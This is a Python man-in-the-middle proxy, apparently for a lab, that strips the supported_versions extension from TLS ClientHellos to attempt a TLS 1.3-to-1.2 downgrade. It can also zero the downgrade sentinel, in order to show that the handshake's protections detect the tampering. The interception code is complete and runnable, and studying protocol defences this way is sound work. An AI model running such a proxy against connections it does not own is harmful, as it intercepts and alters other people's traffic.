#!/usr/bin/env python3
"""
MITM lab proxy.

Default mode: strips the supported_versions (0x002b) extension from the FIRST
ClientHello so a TLS1.3-capable server falls back to TLS1.2 and sets the
RFC 8446 downgrade sentinel in ServerHello.random. A genuine TLS1.3 client that
offered 1.3 will then detect the sentinel and abort (illegal_parameter).   [S2]

MANGLE_SENTINEL=1 : in addition, zero the last 8 bytes of ServerHello.random
(server->client) to try to erase the downgrade sentinel. This shows the *next*
line of defence:
  - ECDHE server  -> server_random is signed in ServerKeyExchange, so tampering
    breaks the signature (bad signature / decrypt error).                   [S3]
  - static-RSA    -> no signature over server_random, but master_secret is
    derived from it, so the Finished MAC no longer matches (bad_record_mac). [S4]

LAB USE ONLY - run only against your own server. Handles the common case where
each handshake flight fits in one TCP read (true for non-PQC handshakes).
"""
import socket, threading, sys, struct, os

# Defaults = bare-metal/WSL (localhost). Override via env for Docker, e.g.
#   LISTEN_HOST=0.0.0.0 LISTEN_PORT=4434 TARGET_HOST=server TARGET_PORT=443
LISTEN = (os.environ.get("LISTEN_HOST", "127.0.0.1"), int(os.environ.get("LISTEN_PORT", "4434")))
TARGET = (os.environ.get("TARGET_HOST", "127.0.0.1"), int(os.environ.get("TARGET_PORT", "4433")))
MANGLE_SENTINEL = os.environ.get("MANGLE_SENTINEL") == "1"

def strip_supported_versions(record: bytes):
    # record: TLS record header (5) + handshake
    if len(record) < 5 or record[0] != 0x16:      # not handshake
        return record, False
    rlen = struct.unpack(">H", record[3:5])[0]
    body = record[5:5+rlen]
    if not body or body[0] != 0x01:               # not ClientHello
        return record, False
    # handshake: type(1) len(3) version(2) random(32) sid_len(1) sid...
    hs_len = int.from_bytes(body[1:4], "big")
    p = 4 + 2 + 32
    sid_len = body[p]; p += 1 + sid_len
    cs_len = struct.unpack(">H", body[p:p+2])[0]; p += 2 + cs_len
    comp_len = body[p]; p += 1 + comp_len
    ext_total = struct.unpack(">H", body[p:p+2])[0]
    ext_start = p + 2
    exts = body[ext_start:ext_start+ext_total]
    out, removed, q = b"", False, 0
    while q + 4 <= len(exts):
        etype = struct.unpack(">H", exts[q:q+2])[0]
        elen  = struct.unpack(">H", exts[q+2:q+4])[0]
        chunk = exts[q:q+4+elen]
        if etype == 0x002b:
            removed = True                        # drop it
        else:
            out += chunk
        q += 4 + elen
    if not removed:
        return record, False
    new_ext_total = len(out)
    new_body = (body[:p] + struct.pack(">H", new_ext_total) + out)
    new_hs_len = len(new_body) - 4
    new_body = new_body[0:1] + new_hs_len.to_bytes(3, "big") + new_body[4:]
    new_record = record[0:3] + struct.pack(">H", len(new_body)) + new_body
    return new_record, True

def mangle_serverhello_random(buf: bytes):
    # buf starts with the ServerHello record (server->client, plaintext in TLS1.2).
    # Zero the last 8 bytes of ServerHello.random = the downgrade sentinel.
    if len(buf) < 5 or buf[0] != 0x16:            # not handshake record
        return buf, False
    rlen = struct.unpack(">H", buf[3:5])[0]
    body = buf[5:5+rlen]
    if len(body) < 38 or body[0] != 0x02:         # not ServerHello
        return buf, False
    # handshake: type(1) len(3) version(2) random(32); sentinel = random[24:32]
    out = bytearray(buf)
    for i in range(5 + 6 + 24, 5 + 6 + 32):       # last 8 bytes of random
        out[i] = 0x00
    return bytes(out), True

def pipe(src, dst):
    try:
        while True:
            d = src.recv(65535)
            if not d: break
            dst.sendall(d)
    except OSError:
        pass
    finally:
        for s in (src, dst):
            try: s.shutdown(socket.SHUT_RDWR)
            except OSError: pass

def handle(client):
    server = socket.create_connection(TARGET)
    first = client.recv(65535)
    new, done = strip_supported_versions(first)
    sys.stderr.write(f"[mitm] ClientHello {len(first)}B -> {len(new)}B "
                     f"supported_versions_stripped={done}\n")
    server.sendall(new)
    threading.Thread(target=pipe, args=(client, server), daemon=True).start()
    if MANGLE_SENTINEL:
        sh = server.recv(65535)
        if sh:
            sh2, mangled = mangle_serverhello_random(sh)
            sys.stderr.write(f"[mitm] ServerHello {len(sh)}B sentinel_zeroed={mangled}\n")
            client.sendall(sh2)
    pipe(server, client)

def main():
    ls = socket.socket(); ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(LISTEN); ls.listen(5)
    sys.stderr.write(f"[mitm] listening {LISTEN} -> {TARGET} "
                     f"mangle_sentinel={MANGLE_SENTINEL}\n")
    while True:
        c, _ = ls.accept()
        threading.Thread(target=handle, args=(c,), daemon=True).start()

if __name__ == "__main__":
    main()
